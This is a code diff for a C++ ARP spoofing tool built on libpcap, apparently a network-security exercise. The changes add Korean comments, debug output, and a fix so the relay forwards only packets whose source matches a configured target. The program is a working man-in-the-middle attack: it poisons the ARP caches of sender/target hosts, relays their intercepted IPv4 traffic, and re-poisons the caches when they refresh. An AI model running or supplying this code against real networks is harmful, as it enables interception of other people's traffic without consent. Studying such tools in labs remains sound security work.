@@ -17,7 +17,7 @@
 #pragma pack(push, 1)
 
 
-struct ipv4_hdr final {
+struct ipv4_hdr final {		//ip 헤더 구조체
 	uint8_t 	version_ihl;
 	uint8_t 	type_of_service;
 	uint16_t 	total_length;
@@ -31,7 +31,7 @@ struct ipv4_hdr final {
 
 };
 
-struct EthIpPacket final {
+struct EthIpPacket final {	//ip 패킷 구조체
 	EthHdr eth_;
 	ipv4_hdr ip_;
 
@@ -42,7 +42,7 @@ struct EthArpPacket final {
 	ArpHdr arp_;
 };
 
-struct flow final {
+struct flow final {		//여러 쌍을 처리하기 위한 flow
 	Ip sender_ip;
 	Mac sender_mac;
 	Ip target_ip;
@@ -101,7 +101,7 @@ int main(int argc, char* argv[]) {
 		sender_mac = get_want_mac(handle, my_ip, my_mac, sender_ip);
 		target_ip = Ip(argv[i+1]);
 		target_mac = get_want_mac(handle, my_ip, my_mac, target_ip);
-
+	
 
 		flow_list[flag].sender_ip = sender_ip;
 		flow_list[flag].sender_mac = sender_mac;
@@ -110,7 +110,12 @@ int main(int argc, char* argv[]) {
 
 		flag++;
 	}
+	for(int o=0;o<flag;o++)
+	{
+		printf("target mac %d: %s\n", o+1,std::string(flow_list[o].target_mac).c_str());	
+		printf("sender mac %d: %s\n", o+1,std::string(flow_list[o].sender_mac).c_str());
 
+	}
 	arp_spoof(handle, my_mac, flow_list, flag);
 
 	while(1)
@@ -231,6 +236,7 @@ Mac get_want_mac(pcap_t* handle, Ip my_ip, Mac my_mac, Ip want_ip)
 		if((arp_reply.eth_.type() == EthHdr::Arp) && (arp_reply.arp_.sip() == want_ip))
 		{
 			want_mac = arp_reply.eth_.smac();
+			printf("want mac: %s\n",std::string(want_mac).c_str());
 			break;
 		}
 	}
@@ -274,17 +280,22 @@ void packet_relay(pcap_t* handle, const u_char* packet, Ip my_ip, Mac my_mac, fl
 	memcpy(&relay_packet, packet, sizeof(relay_packet));
 	memcpy(&request_packet, packet, sizeof(relay_packet));
 
-	if (relay_packet.eth_.type() == EthHdr::Ip4 && (Ip)(relay_packet.ip_.dst_addr) != my_ip)
+
+	if ((relay_packet.eth_.type() == EthHdr::Ip4) && ((Ip)(relay_packet.ip_.dst_addr) != my_ip))
 	{
 		relay_packet.eth_.smac_ = my_mac;
 		for(int i=0;i<flag;i++)
 		{
-			relay_packet.eth_.dmac_ = list[i].target_mac;
-			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&relay_packet), sizeof(relay_packet));
-			if (res != 0)
-			{
-				printf("relay error\n");
-				exit(1);
+			if(relay_packet.ip_.src_addr == list[i].target_ip)
+			{	
+				relay_packet.eth_.dmac_ = list[i].target_mac;
+				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&relay_packet), sizeof(relay_packet));
+				if (res != 0)
+				{
+					printf("relay error\n");
+					exit(1);
+				}
+				printf("packet relayed\n");
 			}
 		}
 	}
@@ -296,6 +307,7 @@ void packet_relay(pcap_t* handle, const u_char* packet, Ip my_ip, Mac my_mac, fl
 			if((Ip)(relay_packet.ip_.src_addr) == list[i].sender_ip)
 			{
 				arp_spoof(handle, my_mac, list, flag);
+				printf("table spoofed\n");
 			}
 
 		}
